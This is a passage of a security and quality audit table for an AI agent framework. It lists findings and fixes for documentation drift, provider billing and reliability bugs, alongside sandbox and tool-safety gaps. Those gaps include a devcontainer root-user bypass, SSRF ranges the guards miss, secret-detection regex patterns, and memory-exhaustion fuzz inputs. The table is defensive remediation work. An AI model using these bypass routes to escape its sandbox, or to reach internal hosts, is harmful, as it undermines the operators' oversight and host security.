| W5-122 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `pitch/SEED-DECK.md:199` | Test-count claims are stale and mutually inconsistent (2000+ / 9,000+ / 9094 / 13,300+) vs 26,145 passing at HEAD | Cite one order-of-magnitude figure ('25,000+ automated tests') sourced from the latest CI summary and drop per-document literals, or generate them. | S |

### docs/release (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-8 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `ARCHITECTURE.md:161` | ARCHITECTURE.md describes a release pipeline that no longer exists (PYPI_API_TOKEN, six packages, :latest/:vX.Y image tags, 'squatted' PyPI name) | Rewrite ARCHITECTURE.md 'Distribution channels' from release.yml/publish.yml (eight packages, OIDC, single immutable `:<version>` tag, draft-then-finalize flow, cosign bundles for Python artifacts) and add it to test_customer_surfaces_do_not_reference_the_retired_repository_owner-style doc drift tests (e.g. assert the doc does not mention PYPI_API_TOKEN or ':latest'). | S |

### docs/sandbox (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-110 | medium | Raised (finder cited evidence; skeptic pass not run); prior | docs-accuracy | `pitch/SECURITY-QUESTIONNAIRE.md:95` | Firecracker is counted as a shipped sandbox/deploy target in seven docs (incl. the security questionnaire) while README and the code call it a scaffold that raises NotImplementedError | State '8 sandbox backends (+ Firecracker scaffold)' consistently, and in SECURITY-QUESTIONNAIRE 6.5/5.3 mark Firecracker as experimental; CODE_QUALITY_AUDIT already downgraded the module itself, the docs never followed. | S |

### docs/security (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-104 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/security/threat-model.md:127` | Public threat model cites a nonexistent command `maverick skills install` (real: `maverick skill install` / `skill add`) | Change to `maverick skill add` (hash-verified catalog install) in threat-model.md:127 and fix skill-index.md:4,74,81 to `maverick skill browse` / `maverick skill add`; consider adding a `skills` -> `skill` alias so both spellings resolve. | S |
| W5-126 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/AI_EVIDENCE_GATEWAY.md:244` | In-repo link from AI_EVIDENCE_GATEWAY.md to ./benchmarks/governance-frontier.md resolves only on the public site (hidden by validation.links.not_found: info) | Link to the repo path (`../benchmarks/GOVERNANCE_FRONTIER_RESULTS.md`) in-tree and let the staging rewrite it, or add a docs/benchmarks/governance-frontier.md stub/symlink; consider raising mkdocs.yml not_found to `warn` now that the private build is clean (verified: strict build passes). | S |

### docs/security-hardening (proxy SSO) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-11 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/security-hardening.md:631` | docs/security-hardening.md still says proxy SSO trusts loopback by default; code refuses it unless trust_loopback=true | Rewrite the section: default is refuse-all; either pin trusted_proxies or set [auth.proxy] trust_loopback = true; include the uvicorn FORWARDED_ALLOW_IPS caveat from the proxy-header findings. | S |

### installer wizard / sandbox/kubernetes (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-104 | medium | Raised (finder cited evidence; skeptic pass not run) | ux | `apps/installer-cli/maverick_installer/wizard.py:5158` | Wizard-generated kubernetes config never runs a command: the backend fails closed on allow_network=false and the wizard does not ask for it | In the wizard's kubernetes branch prompt for allow_network with the NetworkPolicy instructions (or emit the deny-all manifest and set allow_network=true), and validate the config with a dry exec. Better: make the backend apply/verify a NetworkPolicy itself. | S |

### kernel/agent-loop (coding mode) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-27 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/agent.py:3621` | Coding-mode 'one retry max' is dead: _patch_validated is reset on every new FINAL, so the apply-check / test-driven reject loop only ends at max_steps | Track revision attempts in a counter that is NOT reset per FINAL (e.g. `self._patch_revisions += 1` on each rejection, cap at 1-2), keep the per-FINAL reset only for the 'skip re-extraction' purpose, and add a test asserting the coding-mode reject loop terminates after N revisions independent of max_steps. | S |

### kernel/agent-loop dispatch (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-31 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/agent.py:2630` | Wall-clock cap and killswitch are not enforced while a tool executes; a hung tool keeps the goal 'active' past max_wall_seconds | Wrap the dispatch in `asyncio.wait_for(self.tools.run(name, args), timeout=min(budget.remaining_wall(), per_tool_cap))` (per-tool cap from [tools] latency_budget_ms or a new [tools] max_seconds knob + wizard step), and poll killswitch.check() while waiting (mirror _complete_guarded); on timeout record a TOOL_RESULT audit row with disposition 'timeout' and return an ERROR result. Add a test with a never-returning tool and a 1s wall cap. | M |

### kernel/budget + orchestrator (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-30 | medium | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/orchestrator.py:1527` | An unpriced model (UnpricedModelError) is reported to the user as 'hit your spending or time limit ... resume with a higher cap' | Catch UnpricedModelError before BudgetExceeded in both handlers (and in the result.error re-check at 1652-1667) and return the pricing message verbatim with the remediation ('add a ModelPrice to the rate card or set [budget] strict_pricing=false'); tag failure_telemetry/reflexion with class 'unpriced_model'. Also preflight the orchestrator/worker models at run_goal start so the run fails before MCP startup and brief enrichment spend. | S |

### kernel/checkpoint-resume (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-28 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/agent.py:3349` | Durable resume (MAVERICK_DURABLE=1) restores the pre-question checkpoint and discards the new brief, so an answered ask_user question never reaches the model (HITL loop re-asks forever) | On resume, inject the current brief delta as a fresh user turn after the restored history (e.g. append `{'role':'user','content': 'Resumed. New information since the checkpoint:\n' + qa_block}`) or refresh messages[0] with the new brief text; alternatively checkpoint AFTER tool results are appended so the question/answer pairing is consistent. Add a run_goal test with MAVERICK_DURABLE=1 that blocks on ask_user, answers, resumes, and asserts the answer appears in the first resumed LLM call. | M |

### kernel/spawn (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-29 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/tools/spawn.py:527` | spawn_swarm silently truncates the requested agents to the fan-out cap; the tool result never tells the model which sub-tasks were dropped | Return the drop explicitly in the tool result (e.g. a leading '[swarm] NOTE: N of M requested agents were not run (fan-out cap C at depth D): <task previews>; re-issue them in a later call or do them yourself') and post it as a 'plan' entry; consider also re-rendering new blackboard entries since the last turn as a compact delta in each user turn so later cap/seal/denial notes reach the orchestrator. | S |
| W1-37 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/tools/spawn.py:479` | spawn_swarm gather() can return BaseException instances that _format_swarm_results treats as AgentResults (AttributeError on .final) | Use `isinstance(res, BaseException)` consistently in the four consumers (and re-raise CancelledError/KeyboardInterrupt/SystemExit rather than formatting them), matching the n_failed accounting. | S |

### mcp/http_transport (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-75 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-mcp/maverick_mcp/http_transport.py:5` | Hosted MCP HTTP transport advertises 'multi-tenant setups' but binds no tenant per caller; every bearer shares the process tenant | Add an agent_trust registry field (tenant) and have the HTTP dispatch wrap handle_* in tenant_scope(tenant=...) per authorization context (and honor tenant_by_user_enabled with `mcp:<agent.id>` like the dashboard's `api:<principal>`); until then change the docstring/docs to 'one tenant per MCP process'. | M |

### pitch (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-111 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `pitch/AUDIENCE-C.md:108` | Pitch collateral claims 'native installers for Windows / macOS / Linux' that README, press-kit and FEATURES.md explicitly say are not shipped | Rewrite the 'installable today' bullets in AUDIENCE-B/C, ONE-PAGER, SEED-DECK and SECURITY-QUESTIONNAIRE to match README's Status section (reviewed source + PyInstaller binaries when attached to a release; installers are engineering scaffolds). | S |

### pitch/marketing (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-102 | medium | Raised (finder cited evidence; skeptic pass not run); prior | docs-accuracy | `pitch/ONE-PAGER.md:38` | Pack count '2,020' stale in all pitch collateral, FEATURES.md and the public enterprise architecture page (code: 2,031) | Sweep the eleven files to 2,031 and reference a single source (e.g. `docs/FEATURES.md` count) from pitch material; add the pitch dir to whatever check reconciled the count last time (FIXES.md:17). | S |

### pitch/security-questionnaire (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-103 | medium | Raised (finder cited evidence; skeptic pass not run); prior | docs-accuracy | `pitch/SECURITY-QUESTIONNAIRE.md:143` | `maverick proof-pack` does not exist as a CLI command but is the headline 'prove it' instruction in six pitch/security-questionnaire docs | Either register `proof-pack` as a Click command wrapping `maverick.proof_pack.main` (one-line group registration in cli/) or change the six docs to `python -m maverick.proof_pack`. Registering the command is the better fix since the docs are already distributed. | S |

### providers/anthropic billing (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-6 | medium | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/providers/anthropic_provider.py:544` | All Anthropic cache-write tokens are billed at the 1h (2.0x) surcharge although the message-tier breakpoints are written at 5m (1.25x); usage.cache_creation TTL split is ignored | Read usage.cache_creation.ephemeral_5m_input_tokens / ephemeral_1h_input_tokens when present and bill each bucket at its own multiplier (fall back to the current heuristic only when the split is absent); extend Budget.record_tokens to accept the two counts. Mirror in llm._response_call_cost. Update the FEATURES.md caching paragraph to say system/tools=1h, messages=5m. | S |

### providers/anthropic model gating (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-9 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/providers/anthropic_provider.py:61` | Current-generation Anthropic models (Opus 5, Sonnet 5, Fable 5.x) are unknown to the adapter: thinking/temperature gates would 400 and pricing refuses them | Invert the gating: treat 'adaptive-only, no sampling params' as the default for any claude-* id >= 4.7 and only special-case the older families (opus-4-5/4-6, sonnet-4-5/4-6, haiku-4-5) for budget_tokens/temperature/interleaved header; extend effort_supported/_clamp to the 5.x family (all five levels) and allow 'max' on Sonnet 4.6; add rate-card rows (with evidence) for opus-5/sonnet-5/fable; consider `client.models.retrieve(id).capabilities` in doctor to detect unknown ids early. | M |

### providers/anthropic prompt caching (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-4 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/providers/anthropic_provider.py:122` | Prompt-cache minimum table is wrong for the default models (4096 vs 1024 for Opus 4.8 & Sonnet 4.6, 2048 for Opus 4.7); prewarm is skipped and the wrong value is test-locked | Replace the prefix list with a per-family table matching the published minimums (512: opus-5/sonnet-5/fable; 1024: opus-4-8, sonnet-4-6, sonnet-4-5; 2048: opus-4-7; 4096: opus-4-6, opus-4-5, haiku-4-5) and fix test_opus_48_models.py::test_opus_48_uses_4x_min_cache_threshold. Better: drop the estimate gate and let usage.cache_creation_input_tokens tell you whether the warm took. | S |

### providers/openai translator (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-7 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/providers/openai_provider.py:279` | OpenAI-family translator stringifies image/document blocks: vision via openai/gemini/xai/azure sends base64 as prompt text | In _to_openai_messages emit OpenAI content-part arrays: image blocks -> {'type':'image_url','image_url':{'url':f'data:{media_type};base64,{data}'}} (or the url source verbatim); document blocks -> reject with a clear error for providers without file input. Add a translator test with an image block asserting no base64 lands in a text part. | S |

### providers/openai_compatible (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-8 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/providers/openai_provider.py:167` | openai_compatible provider cannot be used without an API key, contradicting its own docstring (LM Studio / llama.cpp are key-less) | For openai_compatible, when no key is configured use a placeholder (e.g. 'no-auth', matching tgi/vllm) for loopback/private-network base_urls, or add `[providers.openai_compatible] auth = "none"`; keep the refusal only for public https hosts. Also note openai_compatible is absent from the '13 providers' list in docs/FEATURES.md:2565. | S |

### release/pipeline (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-3 | medium | Raised (finder cited evidence; skeptic pass not run); prior | ops | `release-cohort.toml:2` | Current release pipeline has never run end-to-end: zero GitHub Releases exist, cohort 0.1.7 unreleased for 3 months, PyPI names empty, Homebrew sha256 is a placeholder | Cut a rehearsal prerelease (e.g. v0.1.7rc1 - release_version.py already classifies rcN as prerelease) on a throwaway branch of main to exercise release.yml -> publish.yml -> finalize end-to-end, or add a `dry_run` workflow_dispatch input that runs every build/verify step against a synthetic tag without publishing. Track 'last successful full release rehearsal' in docs/DISTRIBUTION.md. | M |

### release/signing (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-4 | medium | Raised (finder cited evidence; skeptic pass not run) | supply-chain | `.github/workflows/publish.yml:652` | Python wheel/sdist signatures are bound to publish.yml@refs/heads/main, not to the release tag | Move Python building/signing into release.yml (tag-bound identity) or convert publish.yml into a `workflow_call` reusable workflow invoked from release.yml so the certificate's `job_workflow_ref` carries refs/tags/vX; alternatively verify the certificate's `source-repository-ref`/`source-repository-digest` extensions (cosign `--certificate-github-workflow-ref refs/tags/$TAG` is not sufficient for workflow_run, so the trigger change is the real fix). | M |

### repo/devcontainer (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-81 | medium | Raised (finder cited evidence; skeptic pass not run) | dx | `.devcontainer/devcontainer.json:3` | Devcontainer pins Python 3.12 while the CI floor is 3.10 — the tomllib class of break that cost three PRs is invisible locally | Use `mcr.microsoft.com/devcontainers/python:3.10` (the floor) as the devcontainer image, or add a `uv python install 3.10` + `uv run --python 3.10 -m pytest --co -q` collection smoke to pre-push-lint.sh so import-time 3.10 breaks are caught locally. | S |
| W5-77 | medium | Raised (finder cited evidence; skeptic pass not run) | dx | `.devcontainer/post-create.sh:24` | Three divergent bootstrap recipes; devcontainer bootstrap omits pytest-xdist, pre-commit, detect-secrets and never applies the CI constraint file | Make post-create.sh the single source of truth: `export PIP_CONSTRAINT=requirements/ci.txt` at the top, add `pytest-xdist pytest-timeout pre-commit detect-secrets` to the dev-tool install line, run `pre-commit install` at the end, and have CONTRIBUTING/AGENTS reference the script instead of restating (and mis-stating) it. | S |

### repo/onboarding (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-76 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `CONTRIBUTING.md:15` | CONTRIBUTING quick-start cannot work as written (wrong dir, bare pytest, missing packages, incomplete [dev] extra) | Fix `cd Lightwork`; add evolve + knowledge to the --no-deps list (or point at `.devcontainer/post-create.sh` as the single recipe); replace `pytest -q` with `python3 -m pytest -q -n auto --dist loadfile`; add pytest-xdist, pytest-timeout, vulture, detect-secrets, 'pyjwt[crypto]', cffi, build to the core `[dev]` extra so the 'one shot' claim is true; make docs/CONTRIBUTING.md a symlink or a one-line pointer. | S |

### repo/pre-commit (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-78 | medium | Raised (finder cited evidence; skeptic pass not run) | dx | `.pre-commit-config.yaml:1` | pre-commit config claims to mirror the CI lint job but runs 2 of its 21 gates with an unpinned ruff | Switch the ruff hook to the official `astral-sh/ruff-pre-commit` repo pinned to v0.16.4 (or `entry: python -m ruff check .` with ruff pinned via the constraint file); add a vulture hook (`python -m vulture`) and a pre-push stage hook that calls `scripts/pre-push-lint.sh` so the contract gates run before push; install pre-commit in post-create.sh and run `pre-commit install --hook-type pre-commit --hook-type pre-push`. | S |

### repo/scripts (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-79 | medium | Raised (finder cited evidence; skeptic pass not run) | dx | `scripts/pre-push-lint.sh:123` | scripts/pre-push-lint.sh says it mirrors the CI lint job but omits 11 of the contract gates (reachability, egress, dispatch, audit, migration governance, evaluator anchors, soak ...) | Generate the gate list from one place: move the `python -m maverick.<gate> --ci` list into a small manifest (e.g. `scripts/ci_gates.txt`) consumed by both ci.yml (a loop step) and pre-push-lint.sh, and add a test in test_release_packaging.py that every `run: python -m maverick.*--ci` step in ci.yml's lint job appears in the script. | S |

### safety/secret_detector (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-37 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/safety/secret_detector.py:39` | Secret detector misses AWS session/temporary keys (ASIA) despite advertising AWS coverage | Add `\bASIA[0-9A-Z]{16}\b` to secret_detector and output_policy; add an aws_session_token pattern (base64-ish, contextual `aws_session_token`/`x-amz-security-token`). Reconcile output_policy._SECRET_PATTERNS with secret_detector so the answer-side leak detector covers the same providers (github_pat_ fine-grained, gitlab, twilio, db-connection URIs). | S |

### safety/tool_acl (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-36 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/safety/tool_acl.py:150` | Secure-by-default max_risk="high" tool ceiling drops nothing: no tool is classified above "high" | Introduce a 'critical' tier in RISK_LEVELS and classify funds-movement / mass-delete / prod-write tools as critical, so a 'high' default ceiling actually withholds them; or change the secure-by-default ceiling to 'medium' if the intent is to drop high-risk tools by default; or correct the comment to state the ceiling is redundant with consent gating. Add a test asserting the default ceiling drops the tools the comment names. | M |

### safety/tool_risk (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-123 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/safety/tool_risk.py:279` | 170 default-registered tools have no risk classification and silently inherit 'medium', including hardware/host-mutating ones, so a max_risk='medium' channel ceiling keeps them | Add explicit entries for embedded_device, aria_navigate, a11y, ffmpeg, imagemagick, pandoc, diagram, latex, office_convert, cache_admin, saas_trigger, key_rotation, s3_attachments, transcribe_audio, speak, view_video (high) and classify the pure calculators low; add a CI test that every name registered by base_registry() satisfies tool_risk_is_classified(). | S |

### sandbox/devcontainer (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-88 | medium | Raised (finder cited evidence; skeptic pass not run); prior | security | `packages/maverick-core/maverick/sandbox/devcontainer.py:240` | Devcontainer remoteUser "0", "0:0" or "root:root" bypasses the allow_root pin and runs the agent as root against the writable host mount | Normalise remote_user: split on ':', treat '0' / 'root' (case-insensitive) for either uid or gid as root and route through container_user_args(self.allow_root); also reject non-[A-Za-z0-9_.:-] values. Add tests for '0', '0:0', 'root:root'. | S |
| W1-108 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-core/maverick/sandbox/devcontainer.py:232` | Devcontainer backend hard-codes pids-limit 512 and lacks the cpus knob the docker/podman/kubernetes backends read from [sandbox] | Add pids_limit/cpus dataclass fields to DevcontainerBackend, thread them from build_sandbox, and reuse a shared flag builder with DockerBackend. | S |

### sandbox/env-scrub (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-91 | medium | Raised (finder cited evidence; skeptic pass not run); prior | correctness | `packages/maverick-core/maverick/sandbox/local.py:23` | scrub_env substring regex over-strips benign variables (GIT_AUTHOR_*, CURL_CA_BUNDLE, SSH_AUTH_SOCK, XAUTHORITY, TOKENIZERS_PARALLELISM, PGCONNECT_TIMEOUT) and breaks git identity / TLS / ssh-agent in every tool subprocess | Anchor the regex on word/segment boundaries (e.g. r'(?:^\|_)(KEY\|TOKEN\|...)(?:_\|$)') and add an explicit allowlist of known-benign names (GIT_AUTHOR_*, GIT_COMMITTER_*, CURL_CA_BUNDLE, SSL_CERT_*, TOKENIZERS_PARALLELISM, PGCONNECT_TIMEOUT, XAUTHORITY); decide SSH_AUTH_SOCK deliberately (document if intentionally stripped). Add regression tests for each name. | S |

### sandbox/local+docker (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-89 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/sandbox/local.py:327` | Sandbox output is captured unbounded before truncation — a single command can balloon harness RSS by gigabytes (host DoS from inside every backend) | Stream from the pipes with a bounded ring buffer (e.g. keep only the last 8 KB / 2 KB, discard the rest as it arrives) or read via a thread that stops consuming after N MB and kills the process group; apply the same helper in docker/podman/devcontainer/kubernetes/ssh/firecracker. Add a test that a 200 MB producer does not grow RSS beyond a few MB. | M |

### sandbox/modal (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-87 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/sandbox/modal_backend.py:93` | Modal backend ignores workdir entirely — agent shell runs in a container with no workspace | Upload the workspace (modal.Mount / Sandbox.create(..., mounts=[...], workdir=...)) and sync changed files back, or fail closed and document as scaffold like Firecracker. Add a test that a fake modal client receives the workdir mount. | M |

### sandbox/pool (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-95 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/sandbox/pool.py:275` | cross_run_pool is dead: park_at_run_end has no production caller, so the pool never holds an entry while FEATURES.md says runs park their sandbox | Call maverick.sandbox.pool.park_at_run_end(sandbox) from the agent/orchestrator run-teardown path (where the sandbox is closed) or delete the acquire wiring + knob and the FEATURES claim. Add an integration test that a second build_sandbox after a run reuses the parked handle. | S |
| W1-96 | low | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/sandbox/pool.py:244` | Pool key ignores read_only_paths — a parked DockerBackend would carry its previous run's absolute read-only bind mounts into the next run's container | Include read_only_paths in _key (or refuse to park a DockerBackend whose _read_only_mounts is non-empty); on acquire, clear _read_only_mounts/read_only_paths. Add a test. | S |

### sdks/plugin-ts (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-60 | medium | Raised (finder cited evidence; skeptic pass not run) | ops | `sdks/plugin-ts/package.json:19` | TypeScript plugin SDK has a working test suite that CI never runs | Add a `plugin-ts` job (setup-node 22, `npm ci`, `npm test`) to ci.yml and to the required checks in .github/rulesets/protect-main.json. | S |
| W5-90 | low | Raised (finder cited evidence; skeptic pass not run) | supply-chain | `sdks/plugin-ts/package.json:16` | TypeScript SDK is never built or tested by any workflow and cannot commit a lockfile (package-lock.json is globally gitignored) | Add `!sdks/plugin-ts/package-lock.json` to .gitignore and commit the lock; add a `sdk-ts` job (node 22, `npm ci && npm test`) to ci.yml or mcp-clients.yml and list it in the ruleset's required checks; add a minimal eslint config (`typescript-eslint` recommended) and a `lint` script; align the SDK version with the release cohort. | S |

### shield/updates (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-35 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/shield_updates.py:175` | Federated shield rule updates stage shield_rules.json that no scanner ever loads — advertised feature is inert | Either (a) wire builtin_rules (or guard.Shield) to load and merge data_dir('shield_rules.json') at scan time (validating rule shape, capping count, still fail-open on a corrupt file), closing the loop the docstring/FEATURES describe; or (b) if staging-only is intentional for now, reword FEATURES.md and the docstring to say the rules are staged but not yet applied by the scanner. | M |

### tests/conftest (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-57 | medium | Raised (finder cited evidence; skeptic pass not run) | testing | `conftest.py:35` | Root conftest HOME redirect makes every subprocess-spawning test depend on packages living in system site-packages (2 of 6 baseline failures + all 24 demo failures) | In conftest.py, before rewriting HOME, pin the original user-site so children inherit it: `import site; os.environ.setdefault("PYTHONUSERBASE", site.getuserbase())` (and/or export the parent's `sys.path` via PYTHONPATH in a shared `fresh_process_env()` helper used by the 48 subprocess tests). Add a comment to the docstring naming the trap. | S |

### tools/_ssrf (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-112 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/_ssrf.py:92` | SSRF guards do not block CGNAT 100.64.0.0/10 (Alibaba Cloud metadata 100.100.100.200, Tailscale) because they rely on ipaddress.is_private | Replace the boolean list with `not ip.is_global` and add an explicit `ipaddress.ip_network('100.64.0.0/10')` membership check (is_global is False for CGNAT but keep the explicit range for clarity); apply in both _ssrf._ip_is_blocked and http_fetch._is_private_ip; add a test for 100.100.100.200. | S |
| W1-113 | medium | Raised (finder cited evidence; skeptic pass not run) | ops | `packages/maverick-core/maverick/tools/_ssrf.py:212` | safe_client/safe_async_client pass an explicit transport, which makes httpx ignore HTTP(S)_PROXY; every pinned connector bypasses or breaks behind an egress proxy | Honor proxies explicitly: read httpx's proxy map (httpx.Client()._mounts or `httpx._utils.get_environment_proxies()`), and when a proxy applies to the URL either wrap the pinned transport in httpx.HTTPTransport(proxy=...) with the pin enforced via the CONNECT target, or document/raise that pinning and proxies are mutually exclusive and fall back to the proxy path with the pre-validated IP recorded. Add a test with HTTPS_PROXY set and a mock transport asserting the proxy is used. | M |

### tools/bigquery (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-117 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/tools/bigquery_tool.py:69` | bigquery query ignores `jobComplete`; a query that exceeds the API's default 10s wait is reported as 'ok (0 rows)' | Check `data.get('jobComplete') is False` and either poll `GET /projects/{proj}/queries/{jobId}` until complete (bounded) or return an explicit 'ERROR: job still running (jobId=...)'; pass `maxResults=limit` and `timeoutMs` in the request; add a unit test with a fake response lacking rows and jobComplete=false. | S |

### tools/browser (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-119 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/aria_navigate.py:124` | aria_navigate activate/click has no post-navigation SSRF or capability allow_hosts re-check and its snapshot/find read whatever page the shared browser landed on | After activate (and before snapshot/find) call browser._deny_and_close_current_page(page, _parse_allow_hosts(args)); add 'aria_navigate': 'high' to safety/tool_risk._DEFAULT_RISK; add a test with a fake page whose url becomes http://127.0.0.1/ after click. | S |
| W1-133 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/tools/aria_navigate.py:24` | aria_navigate docstring says it is 'NOT registered in the default tool set' but base_registry registers it under enable_browser | Update the docstring to 'registered alongside browser when enable_browser is set' and cross-reference the guards it must share with browser.py. | S |

### tools/compute (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-118 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/compute.py:106` | compute's no-SymPy fallback (the live default) allows unbounded in-process allocation via string/list multiplication | Apply `_ALLOWED_EXPR_RE` (no quotes/brackets) and the Name allowlist to the fallback path too, reject ast.Str/List/Tuple/Dict/Subscript nodes, cap intermediate magnitude, and run eval under a resource/timeout guard; add fuzz cases to tests/test_compute_fuzz.py for `[0]*10**9` and `'a'*10**9`. | S |

### tools/databricks (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-124 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/tools/databricks_tool.py:59` | databricks read-only gate does not check statement separators, unlike the sibling bigquery/database tools | Import has_unconfirmed_statement_separator from .sql_safety and OR it into needs_confirm exactly as bigquery_tool does; add the stacked-statement test case from tests/test_database_tool.py:199 to the databricks tests. | S |

### tools/email (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-114 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/email_tool.py:100` | email tool uses smtplib/imaplib without an SSL context, so TLS certificate verification is disabled and the app password is exposed to MITM | Build `ctx = ssl.create_default_context()` once and pass `context=ctx` to SMTP_SSL(...), starttls(context=ctx) and IMAP4_SSL(host, ssl_context=ctx); add a test asserting the fake SMTP/IMAP classes receive a context whose verify_mode is CERT_REQUIRED. | S |

